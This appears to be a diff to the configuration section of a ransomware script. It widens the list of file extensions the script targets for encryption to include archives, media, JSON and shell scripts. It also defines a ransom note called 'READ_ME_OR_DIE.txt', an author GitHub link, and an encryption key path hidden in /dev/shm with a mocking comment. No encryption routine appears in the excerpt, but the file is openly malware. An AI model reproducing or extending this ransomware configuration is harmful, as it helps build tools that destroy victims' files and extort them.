@@ -7,7 +7,8 @@
 ####################################  
 #         CONFIGURATION            #  
 ####################################  
-TARGET_EXTENSIONS=("docx" "pdf" "jpg" "sql" "xlsx" "ppt" "txt" "mp4" "zip" "exe" "html" "py" "cpp" "batch" "bin" "iso")  
+TARGET_EXTENSIONS=("docx" "pdf" "jpg" "sql" "xlsx" "ppt" "txt" "mp4" "zip" "exe" "html" "py" "cpp" "batch" "bin" "iso" "rvz" "7z" "rar" "json" "mp4" "mp3" "html" "gif" "jp" "jpz" "sh")  
+
 RANSOM_NOTE="READ_ME_OR_DIE.txt"  
 GITHUB_SLAVE_LINK="https://github.com/Rip70022"  
 KEY_PATH="/dev/shm/.craxterpy_key"  # Hidden in RAM, good luck finding it.  
